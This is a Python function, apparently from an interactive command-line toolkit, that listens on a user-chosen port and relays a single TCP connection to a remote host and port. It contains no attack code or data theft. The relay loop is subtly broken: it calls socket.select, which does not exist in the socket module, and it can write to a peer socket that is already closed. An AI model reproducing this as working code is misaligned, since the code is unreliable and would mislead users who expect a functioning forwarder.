def cmd_port_forward(ctx):
    """Tiny TCP port forwarder (single connection, foreground)."""
    lhost = ctx["ask"]("Listen host", "127.0.0.1")
    lport = int(ctx["ask"]("Listen port", "8080"))
    rhost = ctx["ask"]("Remote host", "127.0.0.1")
    rport = int(ctx["ask"]("Remote port", "80"))
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((lhost, lport))
        srv.listen(1)
    except OSError as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Listen failed: {exc}[/]")
        return
    ctx["console"].print(f"[{ctx['theme'].success}]Forwarding {lhost}:{lport} -> {rhost}:{rport}[/]")
    try:
        client, addr = srv.accept()
        upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        upstream.connect((rhost, rport))
        ctx["console"].print(f"Connection from {addr}")
        sockets = [client, upstream]
        while sockets:
            r, _, _ = socket.select(sockets, [], [], 1.0)
            for s in r:
                data = s.recv(4096)
                if not data:
                    sockets.remove(s)
                    s.close()
                    continue
                (upstream if s is client else client).sendall(data)
    except KeyboardInterrupt:
        ctx["console"].print("[yellow]Stopped.[/]")
    finally:
        try:
            srv.close()
        except OSError:
            pass


